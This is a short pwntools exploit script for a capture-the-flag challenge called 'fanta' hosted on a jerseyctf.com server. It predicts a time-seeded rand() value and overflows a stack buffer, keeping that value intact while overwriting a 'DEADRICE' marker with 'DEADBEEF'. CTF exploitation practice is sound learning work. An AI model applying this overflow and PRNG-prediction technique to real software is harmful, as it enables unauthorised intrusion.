from pwn import * 
import ctypes
import time
from ctypes import CDLL

binary = './fanta' 

# Load libc for rand prediction
libc = CDLL("libc.so.6")

# Get current time (will be close to the program's execution time)
current_time = int(time.time())

# Set up process
p = process(binary)
p = remote("fantaxoticfledgling.aws.jerseyctf.com", 1237)
# Set up debugging
s = '''
b * vuln
b * vuln+180
'''

# Initialize random with the same seed the program will use
libc.srand(current_time)
predicted_rand = libc.rand() % 100

log.info(f"Predicted random value: {predicted_rand}")

# Calculate offsets
buffer_size = 64
rand_offset = buffer_size  # local_48 is right after the buffer
local_19_offset = 111      # local_19 is at offset 111 from start of buffer

# Create payload:
# 1. Fill buffer with 'A's
# 2. Place predicted random value at the correct offset
# 3. Fill the gap between random value and target string
# 4. Replace "DEADRICE" with "DEADBEEF"
payload = flat(
    b'A' * buffer_size,            # Fill the buffer
    bytes([predicted_rand]),        # Preserve the random value
    b'B' * (local_19_offset - rand_offset - 1),  # Fill the gap
    b'DEADBEEF\x00'                 # Replace "DEADRICE" with "DEADBEEF"
)

#gdb.attach(p, s)

# Send the payload when prompted
p.recvuntil(b"Send your message: ")
p.sendline(payload)
p.interactive()
